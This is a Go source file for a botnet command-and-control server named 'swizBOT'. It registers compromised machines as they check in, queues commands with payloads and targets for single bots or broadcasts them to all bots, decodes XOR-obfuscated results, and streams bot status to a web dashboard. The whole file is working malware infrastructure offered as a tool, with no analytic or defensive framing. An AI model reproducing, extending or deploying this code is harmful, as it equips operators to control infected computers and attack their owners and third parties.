package main

import (
    "crypto/tls"
    "embed"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "sync"
    "time"

    "github.com/gorilla/websocket"
)

//go:embed static
var webFS embed.FS

// ============================================================
// Data Structures
// ============================================================

type Bot struct {
    ID        string    `json:"id"`
    IP        string    `json:"ip"`
    OS        string    `json:"os"`
    Arch      string    `json:"arch"`
    LastSeen  time.Time `json:"last_seen"`
    Command   string    `json:"command,omitempty"`
    Payload   string    `json:"payload,omitempty"`
    Target    string    `json:"target,omitempty"`
    Active    bool      `json:"active"`
}

type Command struct {
    ID      string `json:"id"`
    Type    string `json:"type"`
    Payload string `json:"payload"`
    Target  string `json:"target"`
}

type WebSocketMessage struct {
    Type    string `json:"type"`
    BotID   string `json:"bot_id,omitempty"`
    Output  string `json:"output,omitempty"`
    Bots    []Bot  `json:"bots,omitempty"`
}

// ============================================================
// C2 Server Main Structure
// ============================================================

type C2Server struct {
    bots      map[string]*Bot
    mutex     sync.RWMutex
    upgrader  websocket.Upgrader
    clients   map[*websocket.Conn]bool
    wsMutex   sync.RWMutex
}

func NewC2Server() *C2Server {
    return &C2Server{
        bots: make(map[string]*Bot),
        upgrader: websocket.Upgrader{
            CheckOrigin: func(r *http.Request) bool { return true },
        },
        clients: make(map[*websocket.Conn]bool),
    }
}

// ============================================================
// WebSocket Broadcasting
// ============================================================

func (s *C2Server) broadcast(message WebSocketMessage) {
    s.wsMutex.RLock()
    defer s.wsMutex.RUnlock()
    
    for client := range s.clients {
        err := client.WriteJSON(message)
        if err != nil {
            client.Close()
            delete(s.clients, client)
        }
    }
}

func (s *C2Server) websocketHandler(w http.ResponseWriter, r *http.Request) {
    conn, err := s.upgrader.Upgrade(w, r, nil)
    if err != nil {
        fmt.Printf("[!] WebSocket upgrade failed: %v\n", err)
        return
    }
    defer conn.Close()
    
    s.wsMutex.Lock()
    s.clients[conn] = true
    s.wsMutex.Unlock()
    
    fmt.Println("[+] WebSocket client connected")
    
    // Send initial bot list
    s.mutex.RLock()
    bots := make([]Bot, 0, len(s.bots))
    for _, b := range s.bots {
        // Mark active if last seen within 60 seconds
        b.Active = time.Since(b.LastSeen) < 60*time.Second
        bots = append(bots, *b)
    }
    s.mutex.RUnlock()
    
    conn.WriteJSON(WebSocketMessage{
        Type: "bot_update",
        Bots: bots,
    })
    
    // Keep connection alive
    for {
        if _, _, err := conn.ReadMessage(); err != nil {
            break
        }
    }
    
    s.wsMutex.Lock()
    delete(s.clients, conn)
    s.wsMutex.Unlock()
    fmt.Println("[-] WebSocket client disconnected")
}

// ============================================================
// API Handlers
// ============================================================

func (s *C2Server) checkinHandler(w http.ResponseWriter, r *http.Request) {
    botID := r.URL.Query().Get("bot_id")
    os := r.URL.Query().Get("os")
    arch := r.URL.Query().Get("arch")
    
    s.mutex.Lock()
    defer s.mutex.Unlock()
    
    bot, exists := s.bots[botID]
    if !exists {
        bot = &Bot{
            ID:       botID,
            IP:       r.RemoteAddr,
            OS:       os,
            Arch:     arch,
        }
        s.bots[botID] = bot
        fmt.Printf("[+] New bot registered: %s (%s/%s) from %s\n", botID, os, arch, r.RemoteAddr)
        
        // Broadcast bot update to Web UI
        go s.broadcast(WebSocketMessage{
            Type: "bot_update",
            Bots: s.getBotList(),
        })
    }
    
    bot.LastSeen = time.Now()
    
    // Prepare response command
    response := Command{
        ID:      fmt.Sprintf("cmd_%d", time.Now().UnixNano()),
        Type:    bot.Command,
        Payload: bot.Payload,
        Target:  bot.Target,
    }
    
    // Clear command after sending
    if bot.Command != "" {
        fmt.Printf("[→] Sending command to %s: %s %s\n", botID, bot.Command, bot.Payload)
        bot.Command = ""
        bot.Payload = ""
        bot.Target = ""
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(response)
}

func (s *C2Server) resultHandler(w http.ResponseWriter, r *http.Request) {
    body, err := io.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read body", 400)
        return
    }
    defer r.Body.Close()
    
    // XOR decrypt (key 0xAA matches client)
    for i := range body {
        body[i] ^= 0xAA
    }
    
    var resp map[string]interface{}
    if err := json.Unmarshal(body, &resp); err != nil {
        fmt.Printf("[!] Failed to parse result: %v\n", err)
        return
    }
    
    botID, _ := resp["bot_id"].(string)
    output, _ := resp["output"].(string)
    status, _ := resp["status"].(string)
    
    fmt.Printf("[✓] Result from %s [%s]: %s\n", botID, status, output)
    
    // Broadcast result to Web UI
    go s.broadcast(WebSocketMessage{
        Type:   "command_result",
        BotID:  botID,
        Output: output,
    })
    
    w.WriteHeader(http.StatusOK)
}

func (s *C2Server) commandHandler(w http.ResponseWriter, r *http.Request) {
    botID := r.URL.Query().Get("bot_id")
    cmdType := r.URL.Query().Get("cmd")
    payload := r.URL.Query().Get("payload")
    target := r.URL.Query().Get("target")
    
    s.mutex.Lock()
    defer s.mutex.Unlock()
    
    if botID == "*" {
        // Broadcast to all bots
        count := 0
        for id, bot := range s.bots {
            bot.Command = cmdType
            bot.Payload = payload
            bot.Target = target
            fmt.Printf("[→] Broadcast command to %s: %s %s\n", id, cmdType, payload)
            count++
        }
        json.NewEncoder(w).Encode(map[string]interface{}{
            "status":  "sent",
            "message": fmt.Sprintf("Command sent to %d bots", count),
        })
        return
    }
    
    if bot, exists := s.bots[botID]; exists {
        bot.Command = cmdType
        bot.Payload = payload
        bot.Target = target
        fmt.Printf("[→] Command queued for %s: %s %s\n", botID, cmdType, payload)
        json.NewEncoder(w).Encode(map[string]string{
            "status":  "sent",
            "message": "Command queued",
        })
    } else {
        json.NewEncoder(w).Encode(map[string]string{
            "status":  "error",
            "message": "Bot not found",
        })
    }
}

func (s *C2Server) listHandler(w http.ResponseWriter, r *http.Request) {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    
    bots := make([]Bot, 0, len(s.bots))
    for _, b := range s.bots {
        // Create a copy with active status
        botCopy := *b
        botCopy.Active = time.Since(b.LastSeen) < 60*time.Second
        bots = append(bots, botCopy)
    }
    
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(bots)
}

func (s *C2Server) getBotList() []Bot {
    s.mutex.RLock()
    defer s.mutex.RUnlock()
    
    bots := make([]Bot, 0, len(s.bots))
    for _, b := range s.bots {
        botCopy := *b
        botCopy.Active = time.Since(b.LastSeen) < 60*time.Second
        bots = append(bots, botCopy)
    }
    return bots
}

// ============================================================
// Web UI Handlers
// ============================================================

func (s *C2Server) serveWebUI(w http.ResponseWriter, r *http.Request) {
    path := r.URL.Path
    if path == "/" {
        path = "/static/index.html"
    }
    
    // Remove leading slash for embed.FS
    if len(path) > 0 && path[0] == '/' {
        path = path[1:]
    }
    
    content, err := webFS.ReadFile(path)
    if err != nil {
        // Try serving index.html for SPA routing
        if content, err := webFS.ReadFile("static/index.html"); err == nil {
            w.Header().Set("Content-Type", "text/html; charset=utf-8")
            w.Write(content)
            return
        }
        http.NotFound(w, r)
        return
    }
    
    // Set correct content type based on file extension
    switch {
    case len(path) > 5 && path[len(path)-5:] == ".html":
        w.Header().Set("Content-Type", "text/html; charset=utf-8")
    case len(path) > 4 && path[len(path)-4:] == ".css":
        w.Header().Set("Content-Type", "text/css")
    case len(path) > 3 && path[len(path)-3:] == ".js":
        w.Header().Set("Content-Type", "application/javascript")
    }
    
    w.Write(content)
}

func (s *C2Server) apiBotsHandler(w http.ResponseWriter, r *http.Request) {
    s.listHandler(w, r)
}

func (s *C2Server) apiCommandHandler(w http.ResponseWriter, r *http.Request) {
    s.commandHandler(w, r)
}

// ============================================================
// Main Entry Point
// ============================================================

func main() {
    server := NewC2Server()
    
    // Bot API endpoints (for client communication)
    http.HandleFunc("/checkin", server.checkinHandler)
    http.HandleFunc("/result", server.resultHandler)
    http.HandleFunc("/command", server.commandHandler)
    http.HandleFunc("/list", server.listHandler)
    
    // WebSocket endpoint for real-time UI updates
    http.HandleFunc("/ws", server.websocketHandler)
    
    // Web UI API endpoints
    http.HandleFunc("/api/bots", server.apiBotsHandler)
    http.HandleFunc("/api/command", server.apiCommandHandler)
    
    // Web UI static files (must be last - catch-all)
    http.HandleFunc("/", server.serveWebUI)
    
    // Start HTTP Web UI on port 8080 (no TLS, local access or reverse proxy)
    go func() {
        fmt.Println("[+] Web UI running on http://localhost:8080")
        fmt.Println("[+] Access from browser: http://your-server-ip:8080")
        if err := http.ListenAndServe(":8080", nil); err != nil {
            fmt.Printf("[!] Web UI failed to start: %v\n", err)
        }
    }()
    
    // Start HTTPS C2 server on port 8443 (bot communication)
    fmt.Println("[+] swizBOT C2 Server running on :8443")
    fmt.Println("[+] Waiting for bot connections...")
    
    // Generate self-signed cert if needed (for testing)
    // In production, use real certificates
    cert := "server.crt"
    key := "server.key"
    
    // Check if cert files exist, if not, log warning
    if _, err := tls.LoadX509KeyPair(cert, key); err != nil {
        fmt.Println("[!] SSL certificate not found. Generate with:")
        fmt.Println("    openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=localhost'")
        return
    }
    
    if err := http.ListenAndServeTLS(":8443", cert, key, nil); err != nil {
        fmt.Printf("[!] C2 server failed: %v\n", err)
    }
}
